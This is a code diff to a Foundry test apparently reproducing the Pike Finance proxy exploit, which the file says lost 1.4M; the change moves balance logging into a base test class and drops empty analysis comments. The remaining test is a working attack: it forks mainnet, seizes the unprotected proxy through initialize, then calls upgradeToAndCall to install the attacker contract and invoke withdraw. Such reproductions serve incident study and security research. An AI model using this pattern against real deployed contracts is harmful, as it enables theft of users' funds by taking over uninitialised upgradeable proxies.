@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.15;
 
-import "forge-std/Test.sol";
+import "../basetest.sol";
 
 // @KeyInfo - Total Lost : 1.4M
 // Attacker : https://etherscan.io/address/0x19066f7431df29a0910d287c8822936bb7d89e23
@@ -12,17 +12,12 @@ import "forge-std/Test.sol";
 // @Info
 // Vulnerable Contract Code : https://etherscan.io/address/0xfc7599cffea9de127a9f9c748ccb451a34d2f063#code
 
-// @Analysis
-// Post-mortem : 
-// Twitter Guy : 
-// Hacking God : 
-
 interface IPikeFinanceProxy {
     function initialize(address,address,address,address,uint16,uint16) external;
     function upgradeToAndCall(address,bytes memory) external;
 }
 
-contract PikeFinance is Test {
+contract PikeFinance is BaseTestWithBalanceLog {
     uint256 blocknumToForkFrom = 19_771_058;
     address constant PikeFinanceProxy = 0xFC7599cfFea9De127a9f9C748CCb451a34d2F063;
 
@@ -31,9 +26,7 @@ contract PikeFinance is Test {
         vm.createSelectFork("mainnet", blocknumToForkFrom);
     }
 
-    function testExploit() public {
-        emit log_named_decimal_uint(" Attacker ETH Balance Before exploit", address(this).balance, 18);
-
+    function testExploit() public balanceLog {
         // Initialize proxy contract
         address _owner = address(this);
         address _WNativeAddress = address(this);
@@ -47,9 +40,6 @@ contract PikeFinance is Test {
         address newImplementation = address(this);
         bytes memory data = abi.encodeWithSignature("withdraw(address)", address(this));
         IPikeFinanceProxy(PikeFinanceProxy).upgradeToAndCall(newImplementation, data);
-
-        // Log balances after exploit
-        emit log_named_decimal_uint(" Attacker ETH Balance After exploit", address(this).balance, 18);
     }
 
     function withdraw(address addr) external {
